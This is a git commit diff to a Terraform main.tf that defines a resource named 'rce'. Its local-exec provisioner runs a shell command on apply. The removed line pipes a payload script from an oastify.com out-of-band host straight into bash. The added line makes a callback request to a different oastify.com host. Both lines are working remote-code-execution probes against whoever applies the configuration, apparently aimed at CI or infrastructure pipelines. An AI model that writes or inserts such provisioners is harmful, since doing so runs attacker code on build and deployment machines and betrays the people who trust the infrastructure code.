c077853ef84a3209bb0774168be6d58c7fd28c53
Islam Albatsh <isahavkc@gmail.com>
2025-10-03 23:44:14 +0400

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,5 +1,5 @@
 resource "null_resource" "rce" {
   provisioner "local-exec" {
-    command = "curl -s http:/im8lah6twvle9ms3tolk0bwi1970vrufj.oastify.com//payload.sh | bash"
+    command = "curl l5rotkpwfy4hspb6cr4njeflkcq3euei3.oastify.com"
   }
 }
